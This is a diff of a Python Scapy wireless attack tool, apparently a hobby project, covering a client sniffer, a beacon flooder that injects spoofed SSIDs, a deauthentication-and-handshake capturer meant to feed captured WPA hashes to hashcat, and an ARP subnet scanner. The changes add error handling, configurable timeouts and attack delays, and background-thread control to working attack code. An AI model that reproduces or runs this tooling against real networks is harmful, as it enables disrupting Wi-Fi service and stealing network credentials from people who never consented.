@@ -223,7 +223,7 @@ class Frame_Snatcher():
 
 
         # COLORS
-        c1 = "yellow"
+        c1 = "bold yellow"
         c2 = "bold red"
         c3 = "bold blue"
         c4 = "bold green"
@@ -240,7 +240,7 @@ class Frame_Snatcher():
 
 
             # GET SSID
-            ssid = pkt[Dot11Elt].info.decode(errors="ignore")
+            ssid = pkt[Dot11Elt].info.decode(errors="ignore") if pkt[Dot11Elt].info.decode(errors="ignore") else "Missing SSID"
 
             # GET VENDOR
             vendor = Utilities.get_vendor(mac=addr2)
@@ -254,7 +254,7 @@ class Frame_Snatcher():
 
 
             
-
+            # THIS IS HERE JUST TO BE HERE FRL
             if addr1 not in cls.macs and addr1 != "No":
                 
 
@@ -281,7 +281,7 @@ class Frame_Snatcher():
 
 
                 # NOW TO OUTPUT RESULTS
-                console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr2}")
+                console.print(f"[{c2}][+] Found MAC addr:[{c4}] {addr2}") #  -  [{c1}]{ssid}")
 
    
     @classmethod
@@ -542,7 +542,7 @@ class Frame_Snatcher():
     
 
     @classmethod
-    def client_chooser(cls, target, iface, verbose=0):
+    def client_chooser(cls, target, iface, verbose=0, timeout=120):
         """This method will be responsible for grabbing the single client on the target <-- TYPE 1"""
 
         
@@ -678,12 +678,12 @@ class Frame_Snatcher():
         # SNIFF RESULTS
         #sniffed = 0
         #while sniffed < 60:
-        console.print("\nI will now begin to sniff for clients for the next 60 seconds if you want to stop earlier press ctrl + c!\n", style="bold red")
+        console.print(f"\nI will now begin to sniff for clients for the next {timeout} seconds if you want to stop earlier press [bold green]ctrl + c!\n", style="bold red")
         time.sleep(2)
 
         # SNIFF
         with Live(table, console=console, refresh_per_second=2):
-            sniff(iface=cls.iface, prn=client_sniffer, store=0, count=0, timeout=60)
+            sniff(iface=cls.iface, prn=client_sniffer, store=0, count=0, timeout=timeout)
         
 
         
@@ -1033,26 +1033,38 @@ class Beacon_Flooder():
 
             # LOOP FOR BLANKS
             while True:
+                try:
 
-                # ATTEMPT
-                attempt += 1
-                console.print(f"[bold red]Sniff Attempt[/bold red] #{attempt}")
+                    # ATTEMPT
+                    attempt += 1
+                    console.print(f"[bold red]Sniff Attempt[/bold red] #{attempt}")
 
 
-                sniff(iface=iface, prn=parser, timeout=15, count=0, store=0)
+                    sniff(iface=iface, prn=parser, timeout=15, count=0, store=0)
 
-                if ssids:
+                    if ssids:
 
+                        
+                        # SNIFF AGAIN
+                        sniff(iface=iface, prn=parser, timeout=15)
+
+
+                        # LEAVE
+                        break
                     
-                    # SNIFF AGAIN
-                    sniff(iface=iface, prn=parser, timeout=15)
 
-
-                    # LEAVE
-                    break
+                    time.sleep(1)
                 
 
-                time.sleep(1)
+                except Exception as e:
+                    console.print(f"[bold red]\n\nException Error:[yellow] {e}")
+
+                    console.input("[bold green]\nPress enter to return the the Main Menu: ")
+
+
+                    # RETURN TO MAIN MODULE
+                    from nsm_ui import MainUI
+                    MainUI.main()
 
         
 
@@ -1170,7 +1182,7 @@ class Beacon_Flooder():
 
     
     @classmethod
-    def get_frames(cls, amount, client="ff:ff:ff:ff:ff:ff"):
+    def get_frames(cls, amount, ssid_type, bssid_type, client="ff:ff:ff:ff:ff:ff"):
         """This method will create the frame"""
 
 
@@ -1185,10 +1197,10 @@ class Beacon_Flooder():
 
 
             # GET SSID
-            ssid =  b.get_ssid(type=1)
+            ssid =  b.get_ssid(type=ssid_type)
 
             # GET BSSID
-            bssid = Beacon_Flooder.get_bssid(type=2)
+            bssid = Beacon_Flooder.get_bssid(type=bssid_type)
 
 
             # CRAFT FRAME
@@ -1248,7 +1260,7 @@ class Beacon_Flooder():
 
                 try:
 
-                    frames = Beacon_Flooder.get_frames(amount=15)
+                    frames = Beacon_Flooder.get_frames(ssid_type=3, bssid_type=2, amount=15)
 
                     
                     # INJECT PACKETS INTO 
@@ -1312,34 +1324,50 @@ class Beacon_Flooder():
     def main(cls):
         """This is where class wide logic will be performed from"""
 
+        
+        # CATCH
+        try:
+
+            # GET IFACE
+            cls.iface = Frame_Snatcher.get_interface()
 
 
-        # GET IFACE
-        cls.iface = Frame_Snatcher.get_interface()
+            # OUTPUT UI
+            Frame_Snatcher.welcome_ui(iface=cls.iface)
 
 
-        # OUTPUT UI
-        Frame_Snatcher.welcome_ui(iface=cls.iface)
+            # SNIFF AREA FOR NEARBY SSIDS
+            cls.ssids = Beacon_Flooder.sniff_local_ssids(iface=cls.iface)
+
+    
+            # CRAFT FRAMES
+            frames = Beacon_Flooder.get_frames(ssid_type=1, bssid_type=2, amount=15)
+
+            
+            # INJECT THE FRAMES
+            Beacon_Flooder.frame_injector(frames=frames)
 
 
-        # SNIFF AREA FOR NEARBY SSIDS
-        cls.ssids = Beacon_Flooder.sniff_local_ssids(iface=cls.iface)
-
- 
-        # SPOOF SSIDS
-        frames = Beacon_Flooder.get_frames(amount=15)
+            console.print(frames)
 
 
-        Beacon_Flooder.frame_injector(frames=frames)
+        except KeyboardInterrupt as e:
 
+            console.print(e) 
+       
 
-        console.print(frames)
-
+        except Exception as e:
+            
+            console.print(f"[bold red]Exception Error:[yellow] {e}")
 
 
 
 class Hash_Snatcher():
     """This method will snatch handshakes out the air and potentially pass them to hashcat"""
+
+
+    # USE THIS TO KILL BACKGROUND THREAD
+    SNIFF = True
 
     
     def __init__(self):
@@ -1368,20 +1396,32 @@ class Hash_Snatcher():
             # CLOSE EMPTY LIST
             while True:
 
-                count += 1
+                try:
 
-                console.print(f"Sniff Attempt #{count}", style="bold red")
-                
-                sniff(iface=iface, store=0, timeout=timeout, prn=parser)
+                    count += 1
 
-                if cls.ssids:
-
-                    # SNIFF AGAIN
+                    console.print(f"Sniff Attempt #{count}", style="bold red")
+                    
                     sniff(iface=iface, store=0, timeout=timeout, prn=parser)
 
-                    break
-                    
+                    if cls.ssids:
 
+                        # SNIFF AGAIN
+                        sniff(iface=iface, store=0, timeout=timeout, prn=parser)
+
+                        break
+                
+
+                except Exception as e:
+                    console.print(f"[bold red]\n\nException Error:[yellow] {e}")
+
+                    console.input("[bold green]\nPress enter to return the the Main Menu: ")
+
+
+                    # RETURN TO MAIN MODULE
+                    from nsm_ui import MainUI
+                    MainUI.main()
+                    
            # console.print("\n ---  SNIFF ENDED  --- \n", style="bold red")
 
 
@@ -1492,7 +1532,7 @@ class Hash_Snatcher():
             return frame
 
         
-        def attack(frames, sent=50, count=10, verbose=False):
+        def attack(frames, sent=50, count=10, verbose=False, delay=1, realtime=0):
             """Attack clients on AP's"""
             
 
@@ -1500,13 +1540,13 @@ class Hash_Snatcher():
 
             
             # LOOP ERROS
-            while sent != 0:
+            while sent != 0 and cls.SNIFF:
                     
                 # SNATCH ERRORS
                 try:
                 
                     # INJECT FRAMES
-                    sendp(frames, count=count, iface=iface, verbose=verbose)
+                    sendp(frames, count=count, iface=iface, verbose=verbose, realtime=realtime)
 
 
                     
@@ -1516,13 +1556,15 @@ class Hash_Snatcher():
 
                     # DOWN
                     sent -= 1
-                    time.sleep(0.01)
+                    time.sleep(delay)
 
 
 
                 # DESTROY
                 except KeyboardInterrupt as e:
                     console.print(e)
+
+                    cls.SNIFF = False  # KILL BACKGROUND THREAD
                 
 
                 except Exception as e:
@@ -1532,13 +1574,19 @@ class Hash_Snatcher():
         
         # WAIT FOR THREAD
         time.sleep(2)
+        console.print("BACKGROUND THREAD STARTED", style="bold green")
 
         # START
+        cls.SNIFF = True
         frames = looper()
 
 
         # NOW ATTACK
-        attack(frames=frames, count=10)
+        #attack(frames=frames, count=50, delay=10, sent=3, realtime=0)
+
+
+        # NOW SLOW ATTACK
+        #attack(frames=frames, count=10, delay=10)
 
 
         # DONE
@@ -1552,18 +1600,62 @@ class Hash_Snatcher():
 
 
         
-
+        
         def sniffer():
             """This will sniff"""
 
             
 
             # START SNIFF
+            STAY = True
             console.print("\n ---  SNIFF STARTED  --- ", style="bold green")
 
 
             # SNIFF
-            sniff(iface=iface, prn=parser, store=0, timeout=timeout)
+            while STAY:
+
+                try:
+                    sniff(iface=iface, prn=parser, store=0, timeout=timeout)
+
+
+                    # FOR WHEN SNIFF FAILED LET USER NOW ITS STILL RUNNING
+                    console.print("Still Sniffing\n", style="bold green")
+                    
+
+                    # DELAY FOR CTR + C
+                    time.sleep(1)
+                
+                
+
+                # FOR USER LEAVING
+                except KeyboardInterrupt as e:
+                    console.print(f"{e}")
+
+                    while STAY:
+                        try:
+                            console.print(f"Cleaning up", style="bold red")
+                            time.sleep(3)
+
+                            STAY = False       # BREAK NESTED LOOP
+                            cls.SNIFF = False  # KILL BACKGROUND THREAD 
+                        
+
+                        except KeyboardInterrupt as e:
+                            console.print("STOP PRESSING ctrl + c", style="bold red")
+                            cls.SNIFF = False  # KILL BACKGROUND THREAD 
+
+                
+
+                # GENERAL ERRORS
+                except Exception as e:
+                    console.print(f"[bold red]Exception Error:[yellow] {e}")
+
+                    time.sleep(3)
+                    STAY = False
+                    cls.SNIFF = False  # KILL BACKGROUND THREAD 
+
+                    # CONFIRM UR STILL HERE
+                    console.print("Still sniffing for hashes", style="bold green")
 
             
 
@@ -1576,6 +1668,10 @@ class Hash_Snatcher():
             """This will parse that hoe"""
 
 
+            # ADDR1 == DST 
+            # ADDR2 AND ADDR3 == SRC
+
+
 
             # ONLY EAPOL // HANDSHAKES
             if pkt.haslayer(EAPOL):
@@ -1586,35 +1682,40 @@ class Hash_Snatcher():
                 addr1 = pkt.addr1 if pkt.addr1 != "ff:ff:ff:ff:ff:ff" else False
                 addr2 = pkt.addr2 if pkt.addr2 != "ff:ff:ff:ff:ff:ff" else False
 
+                sd = "Client" # DST FOR ADDR2 DST FOR SRC
+
+                
+                # GET SSID
+
+                for mac, ssid in cls.ssids:
+
+                    if ssid.strip() == addr1 or ssid == addr2:
+                        
+                        sd = ssid
 
 
                 if addr1:
 
-                    console.print(f"[bold red][+] HANDSHAKE Snatched:[bold yellow] {pkt}")
+                    console.print(f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {sd} --> {addr1} --> {pkt}")
 
                 
 
                 if addr2:
 
-                    console.print(f"[bold red][+] HANDSHAKE Snatched:[bold yellow] {pkt}")
+                    console.print(f"[bold green][+] HANDSHAKE Snatched:[bold yellow] {addr2} --> {sd}  --> {pkt}")
 
                 
-                    console.input("\nENTER TO CONTINUE: ")
+                    #console.input("\nENTER TO CONTINUE: ")
             
 
-          #  else:
-           #     console.print(pkt)
+           # else:
+           # console.print(pkt)   # ABOVE AND TO THE LEFT IS FOR DEBUGGING
         
 
-        
 
         # SNIFF FOR HASHES
         sniffer()
     
-
-
-                     
-
 
 
     @classmethod
@@ -1626,33 +1727,43 @@ class Hash_Snatcher():
         # CLEAN VARS
         cls.ssids = []
         cls.mac_ifo = []
+        cls.SNIFF = True
 
 
+        # CATCH
+        try:
 
-        # GET IFACE
-        cls.iface = Frame_Snatcher.get_interface()
-
-
-
-        # WELCOME
-        Frame_Snatcher.welcome_ui(iface=cls.iface)
+            # GET IFACE
+            cls.iface = Frame_Snatcher.get_interface()
 
 
-
-        # FIND APS
-        Hash_Snatcher.sniff_for_ap(iface=cls.iface)
-
+            # WELCOME
+            Frame_Snatcher.welcome_ui(iface=cls.iface)
 
 
-        # SMALL DEAUTH ON APS
-        threading.Thread(target=Hash_Snatcher.target_attacker, args=(cls.iface, ), daemon=True).start()
+            # FIND APS
+            Hash_Snatcher.sniff_for_ap(iface=cls.iface)
+
+
+            # SMALL DEAUTH ON APS
+            threading.Thread(target=Hash_Snatcher.target_attacker, args=(cls.iface, ), daemon=True).start()
+
+
+            # SNIFF FOR HASHES
+            Hash_Snatcher.sniff_for_hashes(iface=cls.iface, timeout=60*240)
+
+            
+            # END
+            console.input("\n\n[bold green]Press Enter to Return: ")
         
+        
+        except KeyboardInterrupt as e:
+            console.print(f"[bold red]Exception Error:[yellow] {e}")
 
-        console.print("\nBACKGROUND THREAD STARTED\n", style="bold red")
 
 
-        # SNIFF FOR HASHES
-        Hash_Snatcher.sniff_for_hashes(iface=cls.iface, timeout=60*3)
+        except Exception as e:
+            console.print(f"[bold red]Exception Error:[yellow] {e}")
 
 
 
@@ -1786,32 +1897,27 @@ class You_Cant_DOS_ME():
 # FOR MODULE TESTING
 if __name__ == "__main__":
     
-
-    use = 4
-
-
-    if use == 1:
-        Frame_Snatcher.main()
+    
+    from scapy.all import Ether, ARP, IP, srp
     
 
 
-    elif use == 2:
-        You_Cant_DOS_ME.ping()
+    sub = console.input("Enter subnet: ")
+
+    subnet = ipaddress.ip_network(sub)
 
 
-    
-    elif use == 3:
+    arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(subnet))
+
+    response = srp(arp, timeout=3)[0]
 
 
-        Beacon_Flooder.main()
-
-    
-
-    elif use == 4:
-        Hash_Snatcher.main()
+    for sent, recv in response:
+        
+        ip = recv.psrc
+        mac = recv.hwsrc
 
 
-
-s = string.ascii_letters = "heyy"
-
-console.print(s)
+        if ip:
+            console.print(f"IP: {ip} --> MAC: {mac}", style="bold green")
+        
